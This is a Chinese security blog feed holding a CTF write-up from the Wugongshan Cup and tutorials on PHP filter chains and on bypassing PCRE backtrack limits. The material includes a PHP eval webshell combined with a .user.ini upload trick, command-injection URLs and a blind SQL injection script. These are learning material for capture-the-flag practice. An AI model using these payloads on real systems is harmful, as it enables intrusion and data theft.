function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$content2</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;==========================================&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$content3</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$content3</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/images/filter/16.png"></p><p>在<code>$content1</code>中构造出了字符<code>1</code>，<code>$content2</code>是我们<code>特性一</code>中构造的字符<code>C</code>，第三条输出<code>$content3</code>结果是在第二条结果的过滤器基础上加上了第一条的过滤器，得出的结果就是构造出的<code>&quot;1&quot;</code>在第一位，然后其他的往后推移了一位，这样就把构造出的<code>1</code>和<code>C</code>连接在了一起，如果我们能构造26个字母和所有数字，就可以通过filterchain构造任意语句。</p><p>但是如果想要一个一个构造，效率太低，这里有一个php filter chain的脚本可以高效构造字符串。</p><p><a href="https://github.com/synacktiv/php_filter_chain_generator">filter_chain_generator (github.com)</a></p><p>构造语法<code>python3 php_filter_chain_generator.py --chain &#39;&lt;?php phpinfo(); ?&gt;  &#39;</code></p><p><img src="/images/filter/17.png"></p><p>其中，<code>php://temp</code>流会创建一个临时文件，用来存写数据。具体获得这个文件名用<code>sys_get_temp_dir()</code>函数，它默认的内容为空</p><p>打开py脚本可以看到每个字符对应的编码</p><p><img src="/images/filter/18.png"></p><p>生成php filter chain的函数</p><p><img src="/images/filter/19.png"></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>武功山杯·第一届湘赣边大学生网络安全竞赛</title>
    <link href="/2024/07/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B9%98%E8%B5%A3%E8%BE%B9%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/07/26/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%B9%98%E8%B5%A3%E8%BE%B9%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="武功山杯·第一届湘赣边大学生网络安全竞赛部分赛题复现"><a href="#武功山杯·第一届湘赣边大学生网络安全竞赛部分赛题复现" class="headerlink" title="武功山杯·第一届湘赣边大学生网络安全竞赛部分赛题复现"></a>武功山杯·第一届湘赣边大学生网络安全竞赛部分赛题复现</h3><p>也是第一次比较正式的参加CTF高校赛，以此记录一下</p><h4 id="web4-龙池古庙"><a href="#web4-龙池古庙" class="headerlink" title="web4 龙池古庙"></a>web4 龙池古庙</h4><p><img src="/images/wugongctf/4.png"></p><p><img src="/images/wugongctf/5.png"></p><p>此题是一道.user.ini的上传利用题</p><p>上传一个.png格式图片并抓包，发包到repeat，图片内容为</p><p><code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; &lt;?php phpinfo(); ?&gt;</code></p><p><img src="/images/wugongctf/6.png"></p><p>文件名改为.user.ini</p><p>内容写入<code>auto_prepend_file=.user.ini</code></p><p><img src="/images/wugongctf/7.png"></p><p><img src="/images/wugongctf/8.png"></p><p>发包，上传成功</p><p>得到路径<code>/app/upload/2cd71252e0ea7e65ccb16853a4cdc40f/.user.ini</code></p><p>访问<code>/upload/2cd71252e0ea7e65ccb16853a4cdc40f/index.php</code>执行命令</p><p><img src="/images/wugongctf/9.png"></p><p>蚁剑连接拿flag</p><p><img src="/images/wugongctf/10.png"></p><hr><h4 id="web6-真君擒龙"><a href="#web6-真君擒龙" class="headerlink" title="web6 真君擒龙"></a>web6 真君擒龙</h4><p><img src="/images/wugongctf/1.png"></p><p><img src="/images/wugongctf/2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cmd</span>)&amp;&amp;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&lt;<span class="hljs-number">6</span>&amp;&amp;!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$cmd</span>), <span class="hljs-string">&#x27;nl&#x27;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">从URL的GET请求中获取名为cmd的参数，并将其赋值给变量$cmd。<br><br>if(isset($cmd)&amp;&amp;strlen($cmd)&lt;6&amp;&amp;!strpos(strtolower($cmd), &#x27;nl&#x27;))&#123;：<br>这是一个条件语句，检查三个条件：<br>isset($cmd)：检查$cmd是否已设置。<br>strlen($cmd)&lt;6：检查$cmd的长度是否小于6个字符。<br>!strpos(strtolower($cmd), &#x27;nl&#x27;)：检查$cmd转换为小写后是否不包含字符串&#x27;nl&#x27;。strpos返回字符串在另一字符串中的位置，如果找不到则返回false，加上!表示不包含。<br><br>system($cmd);：<br>如果上述条件都满足，使用system函数执行由$cmd指定的系统命令。<br><br>如果条件不满足，则执行以下代码。<br>die(&quot;no!no!no!&quot;);<br></code></pre></td></tr></table></figure><p>此处我们用od代替nl读取文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">od</span>%<span class="hljs-number">20</span>/*<br></code></pre></td></tr></table></figure><p>读取出一堆数字</p><p>对于od读取的内容可以使用python复原</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(<span class="hljs-built_in">int</span>(ss, <span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-keyword">for</span> ss <span class="hljs-keyword">in</span> s.split()))<br></code></pre></td></tr></table></figure><p><img src="/images/wugongctf/3.png"></p><p>把中间不需要的代码去除即可</p><h5 id="非预期："><a href="#非预期：" class="headerlink" title="非预期："></a>非预期：</h5><p>赛后发现 <code>nl /*</code>也是可以的</p><p><img src="/images/wugongctf/12.png"></p><p>我们试着对strpos()函数进行分析</p><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p><img src="/images/wugongctf/18.png"></p><p>也就是说<code>!strpos(strtolower($cmd), &#39;nl&#39;)</code>的值就是1，也就是这个过滤其实没有用？</p><p>有点腻甜了</p><hr><h4 id="web7-萍水相逢"><a href="#web7-萍水相逢" class="headerlink" title="web7 萍水相逢"></a>web7 萍水相逢</h4><p><img src="/images/wugongctf/11.png"></p><p>打开就一张图片，查看源代码发现www. zip</p><p>访问&#x2F;www. zip下载文件</p><p>解压查看发现是thinkphp</p><p>查看文件发现只实现了控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i&#x27;</span>, <span class="hljs-variable">$code</span>, <span class="hljs-variable">$matches1</span>)) &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$matches1</span>[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$value</span>) &amp;&amp; ! <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$white_fun</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;加把劲~&#x27;</span>;<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(new)|(dump)|(content)|(f)|(php)|(base)|(eval)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\&quot;)|(\/)|(\&gt;)|(\&lt;)|(~)|(\&#123;)|(\&#125;)|(\.)|(,)|(`)|(\$)|(_)|(\^)|(!)|(%)|(\+)|(\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i&#x27;</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;收手吧阿祖&#x27;</span>;<br>                <span class="hljs-keyword">exit</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//var_dump($code);</span><br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;就挺秃然的。&#x27;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>分析一下可利用的源代码</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs txt">if(isset($_GET[&#x27;code&#x27;]))&#123;<br>检查code参数是否存在<br><br>if(preg_match_all(&#x27;/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i&#x27;, $code, $matches1)) &#123;<br>    foreach ($matches1[1] as $value) &#123;<br>        if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123;<br>            echo &#x27;加把劲~&#x27;;<br>            exit;<br>        &#125;<br>    &#125;<br>&#125;<br>使用正则表达式匹配代码中的函数名，并将匹配结果存储在$matches1数组中。<br>遍历匹配到的函数名（$matches1[1]），检查每个函数是否存在且不在白名单（$white_fun）中。<br>如果发现存在且不在白名单中的函数，则输出提示信息&#x27;加把劲~&#x27;并退出脚本。<br><br>if(preg_match(&#x27;/(new)|(dump)|(content)|(f)|(php)|(base)|(eval)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\&quot;)|(\/)|(\&gt;)|(\&lt;)|(~)|(\&#123;)|(\&#125;)|(\.)|(,)|(`)|(\$)|(_)|(\^)|(!)|(%)|(\+)|(\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i&#x27;, $code)) &#123;<br>    echo &#x27;收手吧阿祖&#x27;;<br>    exit;<br>&#125;<br>使用正则表达式匹配$code中是否包含一系列危险字符或关键字。<br>如果匹配到危险字符或关键字，则输出提示信息&#x27;收手吧阿祖&#x27;并退出脚本。<br><br>else&#123;<br>    //var_dump($code);<br>    eval($code);<br>&#125;<br>如果通过上述所有检查，则使用eval函数执行传入的代码（$code）。<br>eval函数会将字符串参数作为PHP代码执行。<br></code></pre></td></tr></table></figure><p><strong>poc:</strong><code>/public/?code=((%27input%27)(%27name%27)((%27input%27)(%27name1%27)));&amp;na``me=system&amp;name1=ls /</code> </p><p><img src="/images/wugongctf/17.png"></p><p><strong>getflag</strong><code>/public/?code=(&#39;input&#39;(&#39;sys&#39;))(&#39;input&#39;(&#39;cmd&#39;));&amp;sys=system&amp;cmd=/readflag</code></p><p><img src="/images/wugongctf/16.png"></p><hr><h4 id="web8-禅蕴杨岐"><a href="#web8-禅蕴杨岐" class="headerlink" title="web8 禅蕴杨岐"></a>web8 禅蕴杨岐</h4><p><img src="/images/wugongctf/13.png"></p><p>打开赛题啥也没有，查看源代码也是</p><p>直接扫目录</p><p><img src="/images/wugongctf/14.png"></p><p>扫到一个<code>/.index.php.swp</code>目录</p><p>访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">contain</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$strpos_res</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$strpos_res</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lvlarrep</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$v1</span></span>)</span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$v1</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">contain</span>(<span class="hljs-variable">$s</span>, <span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">lvlarrep</span>(<span class="hljs-variable">$s</span>, <span class="hljs-variable">$v1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ban_str</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;select,ascii,sub,con,alter table,delete ,drop ,update ,insert into,load_file,/*,*/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ban_str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v1</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">contain</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$v1</span>))&#123;<br>            <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">lvlarrep</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$v1</span>);<br>            <span class="hljs-variable">$str</span> = <span class="hljs-variable">$s</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;, $str);    // 万恶的单引号，必须转义?</span><br><span class="hljs-string">    return $str;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">if (isset($_POST[&#x27;</span>login<span class="hljs-string">&#x27;]))&#123;</span><br><span class="hljs-string">    $db_host = &#x27;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">    $db_user = &#x27;</span>root<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">    $db_pass = &#x27;</span>toor<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">    $db_name = &#x27;</span>ctf<span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);</span><br><span class="hljs-string">    if (!$conn) &#123;</span><br><span class="hljs-string">        die(&#x27;</span>数据库连接失败！<span class="hljs-string">&#x27; . mysqli_connect_error());</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    $username = waf($_POST[&#x27;</span>username<span class="hljs-string">&#x27;]);</span><br><span class="hljs-string">    $password = waf($_POST[&#x27;</span>password<span class="hljs-string">&#x27;]);</span><br><span class="hljs-string">    $sql = &quot;SELECT * FROM user WHERE `username` = &#x27;</span><span class="hljs-variable">$username</span><span class="hljs-string">&#x27; AND `password` = &#x27;</span><span class="hljs-variable">$password</span><span class="hljs-string">&#x27;;&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    $query_result = mysqli_query($conn, $sql);</span><br><span class="hljs-string">    if (mysqli_num_rows($query_result) &gt; 0) &#123;</span><br><span class="hljs-string">        die(&#x27;</span>登陆成功！<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">    &#125;else&#123;</span><br><span class="hljs-string">        die(&#x27;</span>哦欧！<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过转义符来对 username 字段后面的引号做转义，逃逸出后面的部分，然后通过双写绕过</p><p>关键字检测。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://xxxx&#x27;</span><br><br>sess = requests.session()<br>payload = <span class="hljs-string">&#x27;or if(((selunionect asunioncii(suunionbstring(group_counionncat(password),FUZ2Z,1))from user)=FUZZ), 1, 0)  # &#x27;</span><br>post_data = &#123;<br>    <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;login&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>&#125;<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):<br>        post_data[<span class="hljs-string">&#x27;password&#x27;</span>] = payload.replace(<span class="hljs-string">&#x27;FUZZ&#x27;</span>, <span class="hljs-built_in">str</span>(i)).replace(<span class="hljs-string">&#x27;FUZ2Z&#x27;</span>, <span class="hljs-built_in">str</span>(l))<br>        resp = sess.post(url, data=post_data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;登陆成功&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;done&#x27;</span>)<br>        exit()<br></code></pre></td></tr></table></figure><p><img src="/images/wugongctf/15.png"></p>]]></content>
    
    
    <categories>
      
      <category>赛棍</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP利用pcre回溯次数限制的绕过waf</title>
    <link href="/2024/07/19/PHP%E5%88%A9%E7%94%A8prce%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <url>/2024/07/19/PHP%E5%88%A9%E7%94%A8prce%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>参考p神博客：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</a></p><p>参考p神的代码进行分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>     <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$f</span>, <span class="hljs-variable">$input</span>); ...<br>&#125;<br></code></pre></td></tr></table></figure><p>对输入内容进行判断，查看是否有被过滤的内容，如果没有则写入文件。</p><p>过滤内容大致是不允许写php代码</p><p>对此题如何绕过is_php()来写入进项php代码研究</p><h3 id="对正则表达式的深入理解"><a href="#对正则表达式的深入理解" class="headerlink" title="对正则表达式的深入理解"></a>对正则表达式的深入理解</h3><p>常见的正则引擎分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）</p><ul><li><p><strong>DFA:</strong> 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p></li><li><p><strong>NFA：</strong>从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></li></ul><p>NFA执行存在回溯，性能会比DFA差，但是NFA支持的功能更多。</p><p>PHP的PCRE库中就使用了NFA作为正则引擎，所以会存在回溯</p><hr><h4 id="回溯过程："><a href="#回溯过程：" class="headerlink" title="回溯过程："></a>回溯过程：</h4><p>利用在线工具对正则回溯进行分析:<a href="https://hiregex.com/">嗨正则-正则表达式在线测试与调试工具</a></p><p>正则表达式为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;\?.*[(`;<span class="hljs-meta">?&gt;</span>].*<br></code></pre></td></tr></table></figure><p>测试文本为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php phpinfo();//aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/pcre/1.png"></p><p>点击正则执行步骤</p><p><img src="/images/pcre/2.png"></p><p>我们可以看到最终匹配结果为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt; 匹配 &lt;<br>\? 匹配 ?<br>.* 匹配 php phpinfo()<br>[(`;?&gt;] 匹配 ;<br>.* 匹配 //aaaaa<br></code></pre></td></tr></table></figure><p>可以查看每一步匹配的字符</p><p><strong>step1:</strong></p><p><img src="/images/pcre/3.png"></p><p><strong>step2:</strong></p><p><img src="/images/pcre/4.png"></p><p><strong>step3:</strong></p><p><img src="/images/pcre/5.png"></p><p><strong>step4:</strong></p><p><img src="/images/pcre/6.png"></p><p><strong>step5:</strong></p><p><img src="/images/pcre/7.png"></p><p><strong>step6:</strong></p><p><img src="/images/pcre/8.png"></p><p><strong>step7:</strong></p><p><img src="/images/pcre/9.png"></p><p><strong>step8:</strong></p><p><img src="/images/pcre/10.png"></p><p><strong>step9:</strong></p><p><img src="/images/pcre/11.png"></p><p><strong>step10:</strong></p><p><img src="/images/pcre/12.png"></p><p><strong>step11:</strong></p><p><img src="/images/pcre/13.png"></p><p><strong>step12:</strong></p><p><img src="/images/pcre/14.png"></p><p><strong>step13:</strong></p><p><img src="/images/pcre/15.png"></p><p><strong>step14:</strong></p><p><img src="/images/pcre/16.png"></p><p>我们可以发现在step3的时候.*匹配了后面全部字符串，这显然不对</p><p>因为后面的 [(&#96;;?&gt;] 还没有匹配</p><p>所以在step5处开始回溯</p><p>依次吐出一个字符</p><p>直到 [(&#96;;?&gt;] 匹配到 ; 回溯结束</p><p>.*匹配剩下的字符串，匹配成功</p><p>显示红色的表示回溯，一共回溯了8次</p><hr><h3 id="对PHP的pcre-backtrack-limit限制利用"><a href="#对PHP的pcre-backtrack-limit限制利用" class="headerlink" title="对PHP的pcre.backtrack_limit限制利用"></a>对PHP的pcre.backtrack_limit限制利用</h3><p>因为回溯会降低服务的性能，大量的回溯则会产生reDOS</p><p>所以php为了防止正则表达式的拒绝服务攻击(reDOS)</p><p>给pcre设定了回溯次数上限 pcre.backtrack_limit</p><p>可以通过 var_dump(ini_get(‘pcre.backtrack_limit’));</p><p>来查看当前环境对回溯次数的限制</p><p>参考英文版的PHP文档</p><p>默认回溯次数为100万，如果回溯次数超过100万那么preg_match会返回false</p><p>意思就是匹配失败，意味着我们就可以通过发超长字符串，使得正则匹配失败绕过PHP语言限制</p><hr><p><strong>POC</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 